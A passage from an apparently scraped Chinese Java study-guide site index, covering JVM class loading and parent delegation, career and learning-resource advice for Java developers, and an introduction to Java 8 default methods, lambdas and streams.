格式的基础。 从网络中获取，最典型的应用是 Applet。 运行时计算生成，例如动态代理技术，在 java.lang.reflect.Proxy 使用 ProxyGenerator.generateProxyClass 的代理类的二进制字节流。 由其他文件生成，例如由 JSP 文件生成对应的 Class 类。  2. 验证    确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。\n3. 准备    类变量是被 static 修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。\n实例变量不会在这阶段分配内存，它会在对象实例化时随着对象一起被分配在堆中。应该注意到，实例化不是类加载的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次。\n初始值一般为 0 值，例如下面的类变量 value 被初始化为 0 而不是 123。\npublic static int value = 123; 如果类变量是常量，那么它将初始化为表达式所定义的值而不是 0。例如下面的常量 value 被初始化为 123 而不是 0。\npublic static final int value = 123; 4. 解析    将常量池的符号引用替换为直接引用的过程。\n其中解析过程在某些情况下可以在初始化阶段之后再开始，这是为了支持 Java 的动态绑定。\n5. 初始化    \" 初始化阶段才真正开始执行类中定义的 Java 程序代码。初始化阶段是虚拟机执行类构造器 \u0026lt;clinit\\() 方法的过程。在准备阶段，类变量已经赋过一次系统要求的初始值，而在初始化阶段，根据程序员通过程序制定的主观计划去初始化类变量和其它资源。 \u0026lt;clinit\u0026gt;() 是由编译器自动收集类中所有类变量的赋值动作和静态语句块中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序决定。特别注意的是，静态语句块只能访问到定义在它之前的类变量，定义在它之后的类变量只能赋值，不能访问。例如以下代码：\npublic class Test { static { i = 0; // 给变量赋值可以正常编译通过  System.out.print(i); // 这句编译器会提示“非法向前引用”  } static int i = 1; } 由于父类的 \u0026lt;clinit\u0026gt;() 方法先执行，也就意味着父类中定义的静态语句块的执行要优先于子类。例如以下代码：\nstatic class Parent { public static int A = 1; static { A = 2; } } static class Sub extends Parent { public static int B = A; } public static void main(String[] args) { System.out.println(Sub.B); // 2 } 接口中不可以使用静态语句块，但仍然有类变量初始化的赋值操作，因此接口与类一样都会生成 \u0026lt;clinit\u0026gt;() 方法。但接口与类不同的是，执行接口的 \u0026lt;clinit\u0026gt;() 方法不需要先执行父接口的 \u0026lt;clinit\u0026gt;() 方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的 \u0026lt;clinit\u0026gt;() 方法。\n虚拟机会保证一个类的 \u0026lt;clinit\u0026gt;() 方法在多线程环境下被正确的加锁和同步，如果多个线程同时初始化一个类，只会有一个线程执行这个类的 \u0026lt;clinit\u0026gt;() 方法，其它线程都会阻塞等待，直到活动线程执行 \u0026lt;clinit\u0026gt;() 方法完毕。如果在一个类的 \u0026lt;clinit\u0026gt;() 方法中有耗时的操作，就可能造成多个线程阻塞，在实际过程中此种阻塞很隐蔽。\n类初始化时机    1. 主动引用    虚拟机规范中并没有强制约束何时进行加载，但是规范严格规定了有且只有下列五种情况必须对类进行初始化（加载、验证、准备都会随之发生）：\n  遇到 new、getstatic、putstatic、invokestatic 这四条字节码指令时，如果类没有进行过初始化，则必须先触发其初始化。最常见的生成这 4 条指令的场景是：使用 new 关键字实例化对象的时候；读取或设置一个类的静态字段（被 final 修饰、已在编译期把结果放入常量池的静态字段除外）的时候；以及调用一个类的静态方法的时候。\n  使用 java.lang.reflect 包的方法对类进行反射调用的时候，如果类没有进行初始化，则需要先触发其初始化。\n  当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。\n  当虚拟机启动时，用户需要指定一个要执行的主类（包含 main() 方法的那个类），虚拟机会先初始化这个主类；\n  当使用 JDK 1.7 的动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果为 REF_getStatic, REF_putStatic, REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化；\n  2. 被动引用    以上 5 种场景中的行为称为对一个类进行主动引用。除此之外，所有引用类的方式都不会触发初始化，称为被动引用。被动引用的常见例子包括：\n 通过子类引用父类的静态字段，不会导致子类初始化。  System.out.println(SubClass.value); // value 字段在 SuperClass 中定义  通过数组定义来引用类，不会触发此类的初始化。该过程会对数组类进行初始化，数组类是一个由虚拟机自动生成的、直接继承自 Object 的子类，其中包含了数组的属性和方法。  SuperClass[] sca = new SuperClass[10];  常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。  System.out.println(ConstClass.HELLOWORLD); 类与类加载器    两个类相等，需要类本身相等，并且使用同一个类加载器进行加载。这是因为每一个类加载器都拥有一个独立的类名称空间。\n这里的相等，包括类的 Class 对象的 equals() 方法、isAssignableFrom() 方法、isInstance() 方法的返回结果为 true，也包括使用 instanceof 关键字做对象所属关系判定结果为 true。\n类加载器分类    从 Java 虚拟机的角度来讲，只存在以下两种不同的类加载器：\n  启动类加载器（Bootstrap ClassLoader），使用 C++ 实现，是虚拟机自身的一部分；\n  所有其它类的加载器，使用 Java 实现，独立于虚拟机，继承自抽象类 java.lang.ClassLoader。\n  从 Java 开发人员的角度看，类加载器可以划分得更细致一些：\n  启动类加载器（Bootstrap ClassLoader）此类加载器负责将存放在 \u0026lt;JRE_HOME\u0026gt;\\lib 目录中的，或者被 -Xbootclasspath 参数所指定的路径中的，并且是虚拟机识别的（仅按照文件名识别，如 rt.jar，名字不符合的类库即使放在 lib 目录中也不会被加载）类库加载到虚拟机内存中。启动类加载器无法被 Java 程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给启动类加载器，直接使用 null 代替即可。\n  扩展类加载器（Extension ClassLoader）这个类加载器是由 ExtClassLoader（sun.misc.Launcher$ExtClassLoader）实现的。它负责将 \u0026lt;JAVA_HOME\u0026gt;/lib/ext 或者被 java.ext.dir 系统变量所指定路径中的所有类库加载到内存中，开发者可以直接使用扩展类加载器。\n  应用程序类加载器（Application ClassLoader）这个类加载器是由 AppClassLoader（sun.misc.Launcher$AppClassLoader）实现的。由于这个类加载器是 ClassLoader 中的 getSystemClassLoader() 方法的返回值，因此一般称为系统类加载器。它负责加载用户类路径（ClassPath）上所指定的类库，开发者可以直接使用这个类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。\n  双亲委派模型    应用程序是由三种类加载器互相配合从而实现类加载，除此之外还可以加入自己定义的类加载器。\n下图展示了类加载器之间的层次关系，称为双亲委派模型（Parents Delegation Model）。该模型要求除了顶层的启动类加载器外，其它的类加载器都要有自己的父类加载器。这里的父子关系一般通过组合关系（Composition）来实现，而不是继承关系（Inheritance）。\n\n1. 工作过程    一个类加载器首先将类加载请求转发到父类加载器，只有当父类加载器无法完成时才尝试自己加载。\n2. 好处    使得 Java 类随着它的类加载器一起具有一种带有优先级的层次关系，从而使得基础类得到统一。\n例如 java.lang.Object 存放在 rt.jar 中，如果编写另外一个 java.lang.Object 并放到 ClassPath 中，程序可以编译通过。由于双亲委派模型的存在，所以在 rt.jar 中的 Object 比在 ClassPath 中的 Object 优先级更高，这是因为 rt.jar 中的 Object 使用的是启动类加载器，而 ClassPath 中的 Object 使用的是应用程序类加载器。rt.jar 中的 Object 优先级更高，那么程序中所有的 Object 都是这个 Object。\n3. 实现    以下是抽象类 java.lang.ClassLoader 的代码片段，其中的 loadClass() 方法运行过程如下：先检查类是否已经加载过，如果没有则让父类加载器去加载。当父类加载器加载失败时抛出 ClassNotFoundException，此时尝试自己去加载。\npublic abstract class ClassLoader { // The parent class loader for delegation  private final ClassLoader parent; public Class\u0026lt;?\u0026gt; loadClass(String name) throws ClassNotFoundException { return loadClass(name, false); } protected Class\u0026lt;?\u0026gt; loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded  Class\u0026lt;?\u0026gt; c = findLoadedClass(name); if (c == null) { try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found  // from the non-null parent class loader  } if (c == null) { // If still not found, then invoke findClass in order  // to find the class.  c = findClass(name); } } if (resolve) { resolveClass(c); } return c; } } protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } } 自定义类加载器实现    以下代码中的 FileSystemClassLoader 是自定义类加载器，继承自 java.lang.ClassLoader，用于加载文件系统上的类。它首先根据类的全名在文件系统上查找类的字节代码文件（.class 文件），然后读取该文件内容，最后通过 defineClass() 方法来把这些字节代码转换成 java.lang.Class 类的实例。\njava.lang.ClassLoader 的 loadClass() 实现了双亲委派模型的逻辑，自定义类加载器一般不去重写它，但是需要重写 findClass() 方法。\npublic class FileSystemClassLoader extends ClassLoader { private String rootDir; public FileSystemClassLoader(String rootDir) { this.rootDir = rootDir; } protected Class\u0026lt;?\u0026gt; findClass(String name) throws ClassNotFoundException { byte[] classData = getClassData(name); if (classData == null) { throw new ClassNotFoundException(); } else { return defineClass(name, classData, 0, classData.length); } } private byte[] getClassData(String className) { String path = classNameToPath(className); try { InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead; while ((bytesNumRead = ins.read(buffer)) != -1) { baos.write(buffer, 0, bytesNumRead); } return baos.toByteArray(); } catch (IOException e) { e.printStackTrace(); } return null; } private String classNameToPath(String className) { return rootDir + File.separatorChar + className.replace(\u0026#39;.\u0026#39;, File.separatorChar) + \u0026#34;.class\u0026#34;; } } 参考资料     周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011. Chapter 2. The Structure of the Java Virtual Machine Jvm memory Getting Started with the G1 Garbage Collector JNI Part1: Java Native Interface Introduction and “Hello World” application Memory Architecture Of JVM(Runtime Data Areas) JVM Run-Time Data Areas Android on x86: Java Native Interface and the Android Native Development Kit 深入理解 JVM(2)——GC 算法与内存分配策略 深入理解 JVM(3)——7 种垃圾收集器 JVM Internals 深入探讨 Java 类加载器 Guide to WeakHashMap in Java Tomcat example source code file (ConcurrentCache.java)  "},{"id":216,"href":"/questions/java-big-data/","title":"java-big-data","parent":"questions","content":"先说一下自己的经历，大学的时候我从大二开始学习 Java ，然后学了大半年多的安卓。之后就开始学习 Java 后台，学习完 Java 后台一些常用的知识比如 Java基础、Spring、MyBatis等等之后。因为感觉大数据领域发展也挺不错的，所以就接触了一些大数据方面的知识比如当时大数据领域的霸主 Hadoop 。\n 我当时学习了很多比较古老的技术比如现在基本不会用的 JSP、Struts2等等。另外，我\n 所以，我当时在找工作之间也纠结过自己到底是投大数据岗位还是Java后台开发岗位。\n主要纠结点如下：\n 薪资： 大数据当时的薪资水平高于 Java 后台开发很多； 前景： 我个人感觉大数据岗位的发展前景很好； 个人偏见： 感觉大数据开发比 Java后台开发听着高大上点（哈哈，当时的我就是这么真实）；  不过在我分析了大部分公司的大数据岗位的要求以及自身的优势（Java后台开发的实际经验）之后还是义无反顾的只投递 Java 后台开发岗位。\n先来看一下几家典型的互联网公司对大数据工程师的要求（我找的都是允许应届毕业生投递的岗位）：\nSHEIN\n 很多人可以不了解这家低调的公司，主要原因是因为 SHEIN目前的主要业务是出口跨境电商，用户基本集中在海外。SHEIN 这些年的发展非常不错，总的来说是一家值得去的公司。\n SHEIN 的大数据岗位的要求写的还是比较有代代表性的！但是我觉得加上：有扎实的Java基础、熟悉多线程与JVM相关原理 这一条可能会更好！\n一家公司可能并不具有代表性，我们再来找一家公司的大数据岗位看看。\nAlibaba\n说明一下，阿里巴巴大的大数据开发岗位的描述其实挺友好的比如这样描述：\n “如果你有参与过数据处理、分析、挖掘等相关项目更好”、“如果你对Hadoop、Hive、Hbase等分布式平台有一定的理解更好”。\n 实际是这样吗？nonono!我信你个鬼，你个糟老头子坏的很！毕竟这么多人竞争这一个岗位，不会像描述的这么简单。\n如果你对 HDFS、HBase、Hadoop 甚至是 Elasticsearch这些不了解的话，还是会很难入场。\n总结一下（偏大厂）大数据岗位的对于应届生的基本要求（社招的其实也差不多，对于经验要求会更高）:\n 算法和数据结构是最基本的（比如手写快排、手撕红黑树）。 有扎实的Java基础、熟悉多线程与JVM相关原理。 熟练使用 Linux ，熟悉一门脚本语言 shell 或者 Python 熟悉Hadoop架构和工作原理、MapReduce编程、HDFS；熟悉Hive,最好有HQL优化经验； 熟练掌握 Spark 及 Spark Streaming开发，有实际项目研发经验更佳； 熟悉 Elasticsearch、Kafka等技术会是加分项； \u0026hellip;\u0026hellip;  所以，总的来说不论是对于 Java 后台开发还是大数据开发都会要求你的数据结构和算法 Java 基础、多线程、jvm 底层这些掌握的要很好。 很多人 Java 后台的人转大数据开发很快的原因也是在这里。\n正常一点的大数据面试还是比较有难度的，比如如果你写了你会 Spark 的话，他就会问题你：\n 什么场景下用的Spark ？解决了什么问题？ Spark 执行机制了解吗？ Spark 内存模型了解吗？ \u0026hellip;\u0026hellip;  另外，如果你的简历上写了你会 Spring 这些东西的话，面试官应该也会一并提问。可以看出现在的大数据岗位没有强制性要求你有 web 开发经验,在我那一年的时候，大部分大数据开发岗位都要求你还要有 web 开发经验。\n"},{"id":217,"href":"/questions/java-learning-website-blog/","title":"java-learning-website-blog","parent":"questions","content":"推荐两个视频学习网站    慕课网    第一个推荐的学习网站应该是慕课网（慕课网私聊我打钱哈！），在我初学的时候，这个网站对我的帮助挺大的，里面有很多免费的课程，也有很多付费的课程。如果你没有特殊的需求，一般免费课程就够自己学的了。\n哔哩哔哩    想不到弹幕追番/原创视频小站也被推荐了吧！不得不说哔哩哔哩上面的学习资源还是很多的，现在有很多年轻人都在上面学习呢！哈哈哈 大部分年轻人最爱的小破站可是受到过央视表扬的。被誉为年轻人学习的首要阵地，哔哩哔哩干杯！\n不过在哔哩哔哩上面越靠前的视频就是最好的视频或者说最适合你的视频，也是要筛选一下的。\n极客时间    主打付费学习的一个付费学习社区（极客时间私聊我打钱哈！）。不过课程的质量大部分都挺高的，我自己也看了里面很多的课程，并且很多课程都是 Java 领域大佬级别的人物将的。\n推荐一些文字类型学习网站/博客    Github    最牛逼的程序员交流网站！！！没有之一。一定要多逛逛！上面有很多好东西，比如我搜索 Java（它竟然给我返回贼多 javascript 的项目，啥意思？？？）\n比如我搜索女装，emm\u0026hellip;.然后就出来了这些东西，捂住眼睛，不敢看！\n菜鸟教程    对于新手入门来说很不错的网站，大部分教程都是针对的入门级别。优点是网站教程内容比较完善并且内容质量也是有保障的。\nw3cschool    和菜鸟教程类似的一个网站，里面的教程也很齐全。\nStackoverflow    Stack Overflow是一个程序设计领域的问答网站，网站允许注册用户提出或回答问题。和知乎很像，重大的一点不同是 Stack Overflow 可以对问题进行打分。\nleetcode    网站地址：https://leetcode-cn.com/\n工作之余没事去刷个算法题，岂不是美滋滋。\n一些不错的技术交流社区推荐     掘金：https://juejin.im/ 。 segmentfault ： https://segmentfault.com/ 博客园 ： https://www.cnblogs.com/ 慕课网手记 ：https://www.imooc.com/article 知乎 ：https://www.zhihu.com/  一些不错的博客/Github 推荐     SnailClimb 的 Github ：https://github.com/Snailclimb 。（自荐一波哈！主要专注在 Java 基础和进阶、Spring、Spring Boot、Java 面试这方面。） 徐靖峰个人博客 ：https://www.cnkirito.moe/（探讨 Java 生态的知识点，内容覆盖分布式服务治理、微服务、性能调优、各类源码分析） 田小波：http://www.tianxiaobo.com/ （Java 、Spring 、MyBatis 、Dubbo） 周立的博客： http://www.itmuch.com/（Spring Cloud、Docker、Kubernetes，及其相关生态的技术） Hollis: https://www.hollischuang.com/ (Java 后端) 方志朋的专栏 ： https://www.fangzhipeng.com/ （Java 面试 Java 并发 openresty kubernetes Docker 故事 ) 纯洁的微笑 : http://www.ityouknow.com/ （Java、SpringBoot、Spring Cloud） 芋道源码： http://www.iocoder.cn/ (专注源码)。 欢迎自荐 \u0026hellip;\u0026hellip;  "},{"id":218,"href":"/questions/java-training-4-month/","title":"java-training-4-month","parent":"questions","content":"问题描述：\n 最近在北京华软科技公司看到一个招聘，去咨询了人事部，他说培训四个月就能上岗，并且不要学费，上岗后再每还1000元，还一年，这个可靠吗？本人高中毕业，四个月能学会吗？谢谢了！！！\n 下面是正文：\n一般说不要学费，上岗后每月再还1000元这种十有八九都不靠谱，就算你把合同看的再仔细，别人也总有各种办法去刁难你。\n另外，目前的互联网行业已经完全不是它刚开始盛行的样子了。在互联网爆火🔥的初期，你可能会简单用一下语言就能找到一个不错的工作。那时候，即使是没有学历支撑直接从培训班出来的基本也都找到了还算是不错的工作。但是，现在已经完全不一样了。我觉得主要可以从以下几个方面讲：\n 没有学历支撑，直接从培训班出来的找工作会很难，甚至找不到； 面试的难度可以说一年比一年难，学的人越来越多，和你竞争的也越来越多，特别是像面试阿里、腾讯、字节跳动这样的大厂，你可能要和更多人去竞争。“面试造火箭，入职拎螺丝”想想也是正常，毕竟这么多人去竞争那少数的 offer，如果不难点的话，区分度就没那么明显了； 学习计算机专业的越来越多，和你竞争的也越来越多，需求就那么一些，人多了之后，平均工资水平以后应该不会和其他行业差别这么大。但是，我个人感觉技术厉害的还是会很吃香。只是，普通的程序员的工资可能比不上前几年了。  养成一个学习习惯和编程习惯真的太重要了，一个好习惯的养成真的对后面的学习有很大帮助。 说实话我自己当初在这方面吃了不少亏，很多比较好的习惯我也是后面自己才慢慢发现，所以这里想着重给大家说一下有哪些好的学习和编程习惯。另外，不要在意自己会多少框架，真的没有一点用！\n下面是一些我觉得还不错的编程好习惯，希望对大家有帮助。\n编程好习惯推荐     下面这些我都总结在了 Github 上，更多内容可以通过这个链接查看： https://github.com/Snailclimb/programmer-advancement 。\n 正确提问    我们平时任何时候都离不开提问特别是初学的时候，但是真正知道如何正确的提问的人很少。问别人问题前不要来一句“在吗”，你说你问了在吗我是回复好还是不回复好呢 ？不要让别人给你发 32 位的JDK，除非你是喜欢那个人。\n更多关于如何提问的内容，详见 github 上开源版『提问的智慧』 https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.md，抽时间看一下，我想看完之后应该会有很多收获。\n更多内容可以查看我的这篇原创文章：如何提问\n健康生活    我一直觉得这一方面是最重要的，我想很多人和我一样会无意识间忽略它，等到真的身体不舒服了，你才开始意识到健康生活的重要性。\n 除非万不得已，不要熬夜了。熬夜的危害就不用多说了，秃头加内分泌失调，你懂得！ 看电脑45分钟之后，起来走5分钟，看看远方放松一下。不要觉得这5分钟浪费时间，相反，这5分钟可能为你带来更大的效率提升。 可以考虑买一个电脑架子，保护好自己脊椎的同时，办公体验也会提升很多。 可以下载一个护眼宝，感觉可以护眼模式挺棒的，非常适合我们这种需要经常盯着电脑的人使用，强烈安利。  高效搜索    尽量用 google 查找技术资料以及自己在学习中遇到的一些问题。\n解决 bug    程序遇到问题先在 stackoverflow 找找，大部分别人已经遇到过了。如果上面没有的话，再考虑其他解决办法。实在解决不了的话，再去问你觉得有能力帮你解决的人（注意描述好自己的问题，不要随便截一个Bug 图）。\n善于总结    学习完任何一门知识后，你可能当时看视频感觉老师讲的挺容易懂的。但是，过几天后你发现你忘的一干二净，别人问你一个类似的问题，你一点思路都没有。所以，我推荐你学完一门知识后不光要及时复习，还要做好总结，让知识形成一个体系。另外，你可以假想自己要给别人讲这个知识点，你能不能把这个知识点讲清楚呢？如果不能，说明你对这个知识点还没有彻底了解。这也就是人们经常说的费曼学习技巧。\n总结的方式：\n 有道云笔记、OneNote\u0026hellip;\u0026hellip;这类专门用来记录笔记的软件上； 思维导图； 通过写博客输出。可以考虑自己搭建一个博客(hexo+GithubPages非常简单)，你也可以在简书、掘金\u0026hellip;\u0026hellip;等等技术交流社区写博客。Markdown 格式参考：https://github.com/sparanoid/chinese-copywriting-guidelines 中文文案排版指北：https://github.com/sparanoid/chinese-copywriting-guidelines  写博客    写博客有哪些好处：\n 对知识有更加深的认识，让自己的知识体系更加完整; 督促自己学习; 可能会带来不错的经济收入; 提升个人影响力; 拥有更多机会; \u0026hellip;\u0026hellip;  总的来说，写博客是一件利己利彼的事情。你可能会从中收获到很多东西，你写的东西也可能对别人也有很大的帮助。但是，写博客还是比较耗费自己时间的，你需要和工作做好权衡。\n分享是一种美德，任何行业都不是靠单打独斗的，写博客、写好博客是一个程序员很好的习惯。我为人人，人人为我！\n更多内容可以查看我的这篇原创文章：我为什么推荐你写博客?\n多用 Github    没事多去Github转转，如果有能力可以参与到一些开源项目中。多看看别人开源的优秀项目，看看别人的代码和设计思路，看的多了，你的编程思想也会慢慢得到提升。除了这些优秀的开源项目之外，Github上面还有很多不错的开源文档、开源资料什么的，我觉得对我们平时学习都挺有帮助。Github用得好还能装一下，毕竟人家还是一个全英文网站，咳咳咳。\n实践    多去实践，将学到的东西运用到实际项目中去。很多人都找我抱怨过没有实际项目让自己去做，怎么能有项目经验呢？如果实在没有实际项目让你去做，我觉得你可以通过下面几种方式：\n 在网上找一个符合自己能力与找工作需求的实战项目视频或者博客跟着老师一起做。做的过程中，你要有自己的思考，不要浅尝辄止，对于很多知识点，别人的讲解可能只是满足项目就够了，你自己想多点知识的话，对于重要的知识点就要自己学会去往深出学。 Github或者码云上面有很多实战类别项目，你可以选择一个来研究，为了让自己对这个项目更加理解，在理解原有代码的基础上，你可以对原有项目进行改进或者增加功能。 自己动手去做一个自己想完成的东西，遇到不会的东西就临时去学，现学现卖。  注意代码规范    从学习编程的第一天起就要养成不错的编码习惯，包、类、方法的命名这些是最基本的。\n推荐阅读：\n 阿里巴巴Java开发手册（详尽版）https://github.com/alibaba/p3c/blob/master/阿里巴巴Java开发手册（详尽版）.pdf Google Java编程风格指南：http://www.hawstein.com/posts/google-java-style.html Effective Java第三版中文版: https://legacy.gitbook.com/book/jiapengcai/effective-java  沟通能力    程序员也离不开沟通。你可能需要与客户交流需求，还要和同事交流项目问题，还有可能定期需要向领导汇报项目进展情况。所以，我觉得不错的沟通能力也是一个优秀的程序员应该有的基本素质。\n学习方法和学习路线推荐    推荐查看我的这篇文章《可能是最适合你的Java学习方法和路线推荐》，文中提到的学习路线以及方法是笔主根据个人学习经历总结改进后得出，我相信照着这条学习路线来你的学习效率会非常高。\n"},{"id":219,"href":"/java/new-features/java8-common-new-features/","title":"java8-common-new-features","parent":"new-features","content":"我，一个10年老程序员，最近才开始用 Java 8 新特性     本文来自cowbi的投稿~\n Oracle 于 2014 发布了 Java8（jdk1.8），诸多原因使它成为目前市场上使用最多的 jdk 版本。虽然发布距今已将近 7 年，但很多程序员对其新特性还是不够了解，尤其是用惯了 java8 之前版本的老程序员，比如我。\n为了不脱离队伍太远，还是有必要对这些新特性做一些总结梳理。它较 jdk.7 有很多变化或者说是优化，比如 interface 里可以有静态方法，并且可以有方法体，这一点就颠覆了之前的认知；java.util.HashMap 数据结构里增加了红黑树；还有众所周知的 Lambda 表达式等等。本文不能把所有的新特性都给大家一一分享，只列出比较常用的新特性给大家做详细讲解。更多相关内容请看官网关于 Java8 的新特性的介绍。\nInterface    interface 的设计初衷是面向抽象，提高扩展性。这也留有一点遗憾，Interface 修改的时候，实现它的类也必须跟着改。\n为了解决接口的修改与现有的实现不兼容的问题。新 interface 的方法可以用default 或 static修饰，这样就可以有方法体，实现类也不必重写此方法。\n一个 interface 中可以有多个方法被它们修饰，这 2 个修饰符的区别主要也是普通方法和静态方法的区别。\n default修饰的方法，是普通实例方法，可以用this调用，可以被子类继承、重写。 static修饰的方法，使用上和一般类静态方法一样。但它不能被子类继承，只能用Interface调用。  我们来看一个实际的例子。\npublic interface InterfaceNew { static void sm() { System.out.println(\u0026#34;interface提供的方式实现\u0026#34;); } static void sm2() { System.out.println(\u0026#34;interface提供的方式实现\u0026#34;); } default void def() { System.out.println(\u0026#34;interface default方法\u0026#34;); } default void def2() { System.out.println(\u0026#34;interface default2方法\u0026#34;); } //须要实现类重写  void f(); } public interface InterfaceNew1 { default void def() { System.out.println(\u0026#34;InterfaceNew1 default方法\u0026#34;); } } 如果有一个类既实现了 InterfaceNew 接口又实现了 InterfaceNew1接口，它们都有def()，并且 InterfaceNew 接口和 InterfaceNew1接口没有继承关系的话，这时就必须重写def()。不然的话，编译的时候就会报错。\npublic class InterfaceNewImpl implements InterfaceNew , InterfaceNew1{ public static void main(String[] args) { InterfaceNewImpl interfaceNew = new InterfaceNewImpl(); interfaceNew.def(); } @Override public void def() { InterfaceNew1.super.def(); } @Override public void f() { } } 在 Java 8 ，接口和抽象类有什么区别的？\n很多小伙伴认为：“既然 interface 也可以有自己的方法实现，似乎和 abstract class 没多大区别了。”\n其实它们还是有区别的\n  interface 和 class 的区别，好像是废话，主要有：\n 接口多实现，类单继承 接口的方法是 public abstract 修饰，变量是 public static final 修饰。 abstract class 可以用其他修饰符    interface 的方法是更像是一个扩展插件。而 abstract class 的方法是要继承的。\n  开始我们也提到，interface 新增default和static修饰的方法，为了解决接口的修改与现有的实现不兼容的问题，并不是为了要替代abstract class。在使用上，该用 abstract class 的地方还是要用 abstract class，不要因为 interface 的新特性而将之替换。\n记住接口永远和类不一样。\nfunctional interface 函数式接口    定义：也称 SAM 接口，即 Single Abstract Method interfaces，有且只有一个抽象方法，但可以有多个非抽象方法的接口。\n在 java 8 中专门有一个包放函数式接口java.util.function，该包下的所有接口都有 @FunctionalInterface 注解，提供函数式编程。\n在其他包中也有函数式接口，其中一些没有@FunctionalInterface 注解，但是只要符合函数式接口的定义就是函数式接口，与是否有\n@FunctionalInterface注解无关，注解只是在编译时起到强制规范定义的作用。其在 Lambda 表达式中有广泛的应用。\nLambda 表达式    接下来谈众所周知的 Lambda 表达式。它是推动 Java 8 发布的最重要新特性。是继泛型(Generics)和注解(Annotation)以来最大的变化。\n使用 Lambda 表达式可以使代码变的更加简洁紧凑。让 java 也能支持简单的函数式编程。\n Lambda 表达式是一个匿名函数，java 8 允许把函数作为参数传递进方法中。\n 语法格式    (parameters) -\u0026gt; expression 或 (parameters) -\u0026gt;{ statements; } Lambda 实战    我们用常用的实例来感受 Lambda 带来的便利\n替代匿名内部类    过去给方法传动态参数的唯一方法是使用内部类。比如\n1.Runnable 接口\nnew Thread(new Runnable() { @Override public void run() { System.out.println(\u0026#34;The runable now is using!\u0026#34;); } }).start(); //用lambda new Thread(() -\u0026gt; System.out.println(\u0026#34;It\u0026#39;s a lambda function!\u0026#34;)).start(); 2.Comperator 接口\nList\u0026lt;Integer\u0026gt; strings = Arrays.asList(1, 2, 3); Collections.sort(strings, new Comparator\u0026lt;Integer\u0026gt;() { @Override public int compare(Integer o1, Integer o2) { return o1 - o2;} }); //Lambda Collections.sort(strings, (Integer o1, Integer o2) -\u0026gt; o1 - o2); //分解开 Comparator\u0026lt;Integer\u0026gt; comperator = (Integer o1, Integer o2) -\u0026gt; o1 - o2; Collections.sort(strings, comperator); 3.Listener 接口\nJButton button = new JButton(); button.addItemListener(new ItemListener() { @Override public void itemStateChanged(ItemEvent e) { e.getItem(); } }); //lambda button.addItemListener(e -\u0026gt; e.getItem()); 4.自定义接口\n上面的 3 个例子是我们在开发过程中最常见的，从中也能体会到 Lambda 带来的便捷与清爽。它只保留实际用到的代码，把无用代码全部省略。那它对接口有没有要求呢？我们发现这些匿名内部类只重写了接口的一个方法，当然也只有一个方法须要重写。这就是我们上文提到的函数式接口，也就是说只要方法的参数是函数式接口都可以用 Lambda 表达式。\n@FunctionalInterface public interface Comparator\u0026lt;T\u0026gt;{} @FunctionalInterface public interface Runnable{} 我们自定义一个函数式接口\n@FunctionalInterface public interface LambdaInterface { void f(); } //使用 public class LambdaClass { public static void forEg() { lambdaInterfaceDemo(()-\u0026gt; System.out.println(\u0026#34;自定义函数式接口\u0026#34;)); } //函数式接口参数  static void lambdaInterfaceDemo(LambdaInterface i){ System.out.println(i); } } 集合迭代    void lamndaFor() { List\u0026lt;String\u0026gt; strings = Arrays.asList(\u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;); //传统foreach  for (String s : strings) { System.out.println(s); } //Lambda foreach  strings.forEach((s) -\u0026gt; System.out.println(s)); //or  strings.forEach(System.out::println); //map  Map\u0026lt;Integer, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.forEach((k,v)-\u0026gt;System.out.println(v)); } 方法的引用    Java 8 允许使用 :: 关键字来传递方法或者构造函数引用，无论如何，表达式返回的类型必须是 functional-interface。\npublic class LambdaClassSuper { LambdaInterface sf(){ return null; } } public class LambdaClass extends LambdaClassSuper { public static LambdaInterface staticF() { return null; } public LambdaInterface f() { return null; } void show() { //1.调用静态函数，返回类型必须是functional-interface  LambdaInterface t = LambdaClass::staticF; //2.实例方法调用  LambdaClass lambdaClass = new LambdaClass(); LambdaInterface lambdaInterface = lambdaClass::f; //3.超类上的方法调用  LambdaInterface superf = super::sf; //4. 构造方法调用  LambdaInterface tt = LambdaClassSuper::new; } } 访问变量    int i = 0; Collections.sort(strings, (Integer o1, Integer o2) -\u0026gt; o1 - i); //i =3; lambda 表达式可以引用外边变量，但是该变量默认拥有 final 属性，不能被修改，如果修改，编译时就报错。\nStream    java 新增了 java.util.stream 包，它和之前的流大同小异。之前接触最多的是资源流，比如java.io.FileInputStream，通过流把文件从一个地方输入到另一个地方，它只是内容搬运工，对文件内容不做任何CRUD。\nStream依然不存储数据，不同的是它可以检索(Retrieve)和逻辑处理集合数据、包括筛选、排序、统计、计数等。可以想象成是 Sql 语句。\n它的源数据可以是 Collection、Array 等。由于它的方法参数都是函数式接口类型，所以一般和 Lambda 配合使用。\n流类型     stream 串行流 parallelStream 并行流，可多线程执行  常用方法    接下来我们看java.util.stream.Stream常用方法\n/** * 返回一个串行流 */ default Stream\u0026lt;E\u0026gt; stream() /** * 返回一个并行流 */ default Stream\u0026lt;E\u0026gt; parallelStream() /** * 返回T的流 */ public 